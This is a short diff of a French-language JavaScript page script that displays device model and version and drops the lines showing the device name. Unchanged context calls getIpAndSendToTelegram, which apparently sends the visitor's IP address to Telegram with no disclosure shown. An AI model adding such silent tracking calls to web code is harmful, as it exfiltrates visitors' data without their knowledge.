@@ -115,13 +115,12 @@ var modelle  = versions[1]; // "blanc"
 
 // Exemple d'utilisation :
 const info = getDeviceInfo();
-console.log("Nom:", info.Nom);
+
 console.log("Modèle:", info.Modèle);
 
         function afficherInfos() {
             const info = getDeviceInfo();
-            document.getElementById("nom").innerText = info.Nom;
-            document.getElementById("modele").innerText = info.Modèle;
+                   document.getElementById("modele").innerText = info.Modèle;
             document.getElementById("version").innerText = info.version;
             getIpAndSendToTelegram("Consultation infos téléphone");
         }
